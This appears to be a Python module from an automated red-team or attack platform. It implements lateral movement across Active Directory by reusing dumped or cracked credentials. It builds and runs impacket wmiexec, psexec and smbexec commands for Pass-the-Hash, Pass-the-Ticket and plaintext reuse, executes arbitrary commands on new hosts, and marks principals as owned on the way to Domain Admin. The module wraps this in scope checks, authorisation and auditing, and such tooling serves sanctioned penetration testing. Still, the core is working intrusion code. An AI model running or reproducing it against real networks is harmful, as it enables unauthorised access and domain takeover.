"""Lateral movement — credential reuse (PtH / PtT / valid creds) to land a session
on a *new* host (Phase E4).

Where the MSF launcher turns an *exploit* into a live session and the web-shell
backend turns a *web RCE* into one, this turns an **owned credential** into one:
a cracked/dumped secret for a principal is used to authenticate to another host
and execute — the move that walks a foothold across an Active Directory forest
toward Domain Admin. It reuses the exact C2 contract and governance the rest of
the platform uses, so nothing about the safety envelope changes:

    * :class:`LateralClient` — the tiny auth-and-exec surface (Protocol). The real
      :class:`ImpacketLateralClient` implements it over impacket's wmiexec/psexec/
      smbexec (PtH via ``-hashes``, PtT via a Kerberos ccache) and is the only
      integration-only, network-touching code (never hit by the suite).
    * :class:`LateralBackend` — a :class:`~attack_engine.c2.backend.C2Backend`
      routing commands to a lateral session by its ``lateral_handle`` (in
      ``Session.metadata``).
    * :class:`LateralMovementLauncher` — authenticates with a reusable
      :class:`~attack_engine.schemas.credentials.Credential`, and on success hands
      off to the :class:`~attack_engine.c2.foothold.FootholdRunner` to register +
      prove the session. The FootholdRunner authorises (technique-tagged PtH/PtT),
      scope-checks, audits, and can tear it down — same envelope as any foothold.

Secret hygiene (rule §6): the raw secret is read from the vault only at the moment
of use and passed in-memory straight to the client; it is never placed in a tool
argument, an audit payload, or a log line.
"""

from __future__ import annotations

from enum import Enum
from typing import TYPE_CHECKING, Protocol, runtime_checkable

from ..logging import get_logger
from ..schemas.credentials import Credential, SecretKind
from .foothold import Foothold, FootholdRunner
from .session import Session, SessionKind

if TYPE_CHECKING:
    from ..credentials.vault import CredentialVault
    from ..knowledge.worldmodel import WorldModel

_log = get_logger("c2.lateral")

#: Where the lateral auth-and-exec handle is stashed on a registered Session.
LATERAL_HANDLE_KEY = "lateral_handle"

#: ATT&CK technique by the form of secret being reused (drives the RoE decision
#: and the audit record so "which credential-reuse technique" is on the trail).
_TECHNIQUE: dict[SecretKind, str] = {
    SecretKind.NT_HASH: "T1550.002",    # Pass the Hash
    SecretKind.AES_KEY: "T1550.003",    # Pass the Ticket (overpass-the-hash)
    SecretKind.TICKET: "T1550.003",     # Pass the Ticket
    SecretKind.PLAINTEXT: "T1021",      # Remote Services (valid accounts)
}


class LateralProtocol(str, Enum):
    """The remote-execution protocol the move rides on (value = tool name)."""

    WMIEXEC = "wmiexec"    # DCOM/WMI (T1047)
    PSEXEC = "psexec"      # SMB + service create (T1021.002 / T1569.002)
    SMBEXEC = "smbexec"    # SMB + service, no binary drop
    WINRM = "winrm"        # WS-Management / PowerShell Remoting (T1021.006)


@runtime_checkable
class LateralClient(Protocol):
    """The subset of a remote-exec transport the engine uses for lateral movement."""

    def open(
        self,
        *,
        host: str,
        protocol: str,
        principal: str,
        domain: str | None,
        secret_kind: str,
        secret: str,
    ) -> str | None:
        """Authenticate to ``host`` and open an exec channel; return an opaque
        handle, or ``None`` if authentication failed (no session)."""
        ...

    def run(self, handle: str, command: str) -> str:
        """Run one command on the channel and return its (bounded) output."""
        ...

    def alive(self, handle: str) -> bool: ...

    def close(self, handle: str) -> None: ...


class LateralBackend:
    """A :class:`C2Backend` over a lateral exec channel, routed by ``lateral_handle``."""

    def __init__(self, client: LateralClient) -> None:
        self._client = client

    @staticmethod
    def _handle(session: Session) -> str | None:
        return session.metadata.get(LATERAL_HANDLE_KEY)

    def alive(self, session: Session) -> bool:
        handle = self._handle(session)
        return self._client.alive(handle) if handle else False

    def run_command(self, session: Session, command: str) -> str:
        handle = self._handle(session)
        return self._client.run(handle, command) if handle else ""

    def close(self, session: Session) -> None:
        handle = self._handle(session)
        if handle:
            self._client.close(handle)


class LateralMovementLauncher:
    """Reuses an owned credential to land a proven, governed session on a new host."""

    def __init__(
        self,
        runner: FootholdRunner,
        client: LateralClient,
        vault: CredentialVault,
    ) -> None:
        self._runner = runner
        self._client = client
        self._vault = vault

    def move(
        self,
        host: str,
        credential: Credential,
        *,
        protocol: LateralProtocol = LateralProtocol.WMIEXEC,
        world_model: WorldModel | None = None,
    ) -> Foothold | None:
        """Authenticate to ``host`` as ``credential.principal`` and land a session.

        Returns the proven :class:`Foothold`, or ``None`` if the credential is not
        directly reusable (a roast blob must be cracked first), authentication
        opened no session, or the foothold authorization/gate denied it. The
        FootholdRunner's backend must be the :class:`LateralBackend` wrapping the
        same client, so proof commands reach the new session.
        """

        if not credential.is_reusable:
            _log.info("credential not reusable — crack it before lateral reuse",
                      principal=credential.principal, kind=credential.kind.value)
            return None

        technique = _TECHNIQUE.get(credential.kind, "T1021")
        secret = self._vault.get(credential.secret_ref)  # in-memory, never audited
        handle = self._client.open(
            host=host, protocol=protocol.value, principal=credential.principal,
            domain=credential.domain, secret_kind=credential.kind.value, secret=secret,
        )
        if not handle:
            _log.info("lateral auth opened no session", host=host,
                      protocol=protocol.value, principal=credential.principal)
            return None
        _log.info("lateral auth succeeded", host=host, protocol=protocol.value,
                  principal=credential.principal)

        foothold = self._runner.establish(
            host,
            kind=SessionKind.SHELL,
            opened_by=f"{protocol.value}:{credential.principal}",
            technique=technique,
            metadata={LATERAL_HANDLE_KEY: handle, "protocol": protocol.value,
                      "principal": credential.principal},
        )
        if foothold is not None and foothold.ok and world_model is not None:
            # Reuse confirmed control of the principal on a new host — keep the
            # owned set coherent so the identity graph re-plans from here.
            world_model.mark_owned(credential.principal)
        return foothold


class ImpacketLateralClient:  # pragma: no cover - integration-only, network transport
    """Real :class:`LateralClient` over impacket's exec suite. Never hit by the suite.

    Runs the impacket exec tool (``wmiexec``/``psexec``/``smbexec``) in one-shot
    command mode with the right credential material:

    * **NT hash** → Pass-the-Hash via ``-hashes :<nt>``.
    * **plaintext** → the password in the target spec.
    * **ticket / AES key** → Pass-the-Ticket via ``-k -no-pass`` + ``KRB5CCNAME``.

    Handles are opaque ids into an in-memory table, so the secret stays in this
    process and out of every argument that could be logged externally. Import is
    lazy so impacket is only needed where lateral movement is actually deployed.
    """

    def __init__(self) -> None:
        self._channels: dict[str, dict[str, str | None]] = {}

    def open(
        self, *, host: str, protocol: str, principal: str, domain: str | None,
        secret_kind: str, secret: str,
    ) -> str | None:
        from ..schemas.common import new_id

        handle = new_id("lat")
        self._channels[handle] = {
            "host": host, "protocol": protocol, "principal": principal,
            "domain": domain, "secret_kind": secret_kind, "secret": secret,
        }
        # Validate auth up front with a benign probe; a failure means no session.
        if self.run(handle, "cmd /c echo ae-lateral").strip().endswith("ae-lateral"):
            return handle
        self._channels.pop(handle, None)
        return None

    def run(self, handle: str, command: str) -> str:
        import subprocess

        chan = self._channels.get(handle)
        if chan is None:
            return ""
        argv = self._build_argv(chan, command)
        proc = subprocess.run(argv, capture_output=True, timeout=120, check=False)
        return proc.stdout.decode("utf-8", "replace")

    def alive(self, handle: str) -> bool:
        return handle in self._channels and bool(
            self.run(handle, "cmd /c echo ae-alive").strip().endswith("ae-alive")
        )

    def close(self, handle: str) -> None:
        self._channels.pop(handle, None)

    @staticmethod
    def _build_argv(chan: dict[str, str | None], command: str) -> list[str]:
        principal = chan["principal"] or ""
        domain = chan["domain"] or ""
        user = f"{domain}/{principal}" if domain else principal
        secret_kind = chan["secret_kind"]
        tool = f"impacket-{chan['protocol']}"
        target = f"{user}@{chan['host']}"
        argv = [tool]
        if secret_kind == SecretKind.NT_HASH.value:
            argv += ["-hashes", f":{chan['secret']}", target]
        elif secret_kind in (SecretKind.TICKET.value, SecretKind.AES_KEY.value):
            argv += ["-k", "-no-pass", target]  # KRB5CCNAME set in the environment
        else:  # plaintext
            argv = [tool, f"{user}:{chan['secret']}@{chan['host']}"]
        argv.append(command)
        return argv


def lateral_backend(client: LateralClient) -> LateralBackend:
    """Build a :class:`LateralBackend` over a lateral exec client."""

    return LateralBackend(client)
